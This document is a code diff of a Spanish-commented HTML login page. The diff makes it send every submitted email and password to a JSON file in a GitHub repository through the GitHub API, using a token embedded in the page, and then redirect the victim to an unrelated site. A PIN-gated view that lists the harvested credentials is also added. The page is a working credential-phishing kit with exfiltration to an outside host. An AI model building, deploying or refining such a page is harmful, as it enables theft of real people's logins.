@@ -56,43 +56,66 @@ body { margin: 0; font-family: Arial, sans-serif; background: linear-gradient(13
 </div>
 
 <script>
+// Configuración GitHub
+const token = 'TU_TOKEN_AQUI'; // Tu token personal de GitHub
+const owner = 'TU_USUARIO';
+const repo = 'NOMBRE_REPO';
+const path = 'datos.json';
+
 const loginForm = document.getElementById('loginForm');
 const recoverLink = document.getElementById('recoverLink');
 const historialContainer = document.getElementById('historialContainer');
 const historialTableBody = document.getElementById('historialTableBody');
 
-// Guardar datos y redirigir al enviar el formulario
+// Función para guardar datos en GitHub
+async function guardarDatosGitHub(email, password) {
+  // Obtener contenido actual del JSON
+  const res = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`);
+  const data = await res.json();
+  const contenido = JSON.parse(atob(data.content));
+
+  // Agregar nuevo registro
+  contenido.push({ email, password, fecha: new Date().toLocaleString() });
+
+  // Subir archivo actualizado
+  await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
+    method: 'PUT',
+    headers: {
+      'Authorization': `token ${token}`,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      message: 'Actualizar datos',
+      content: btoa(JSON.stringify(contenido, null, 2)),
+      sha: data.sha
+    })
+  });
+}
+
+// Enviar formulario
 loginForm.addEventListener('submit', function(e){
   e.preventDefault();
   const email = this.email.value;
   const password = this.password.value;
 
-  // Obtener historial previo
-  let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
-
-  // Agregar nuevo registro
-  historial.push({ email, password, fecha: new Date().toLocaleString() });
-
-  // Guardar historial actualizado
-  localStorage.setItem('historialDatos', JSON.stringify(historial));
-
-  // Redirigir a la página deseada
-  window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+  guardarDatosGitHub(email, password)
+    .then(() => {
+      alert("Datos guardados ✅");
+      window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
+    })
+    .catch(err => console.error(err));
 });
 
-// Mostrar historial al hacer clic en el enlace con PIN
-recoverLink.addEventListener('click', function(){
+// Mostrar historial con PIN
+recoverLink.addEventListener('click', async function(){
   const pin = prompt("Ingresa el PIN para acceder a los datos:");
 
   if(pin === "2006"){
-    // Obtener historial
-    let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
+    const res = await fetch(`https://raw.githubusercontent.com/${owner}/${repo}/main/${path}`);
+    const datos = await res.json();
 
-    // Limpiar tabla previa
     historialTableBody.innerHTML = "";
-
-    // Llenar tabla
-    historial.forEach((dato, index) => {
+    datos.forEach((dato, index) => {
       const tr = document.createElement('tr');
       tr.innerHTML = `
         <td>${index + 1}</td>
@@ -103,10 +126,7 @@ recoverLink.addEventListener('click', function(){
       historialTableBody.appendChild(tr);
     });
 
-    // Mostrar contenedor
     historialContainer.style.display = "block";
-
-    // Scroll hasta la tabla
     historialContainer.scrollIntoView({ behavior: 'smooth' });
   } else {
     alert("PIN incorrecto ❌");
@@ -116,3 +136,4 @@ recoverLink.addEventListener('click', function(){
 
 </body>
 </html>
+
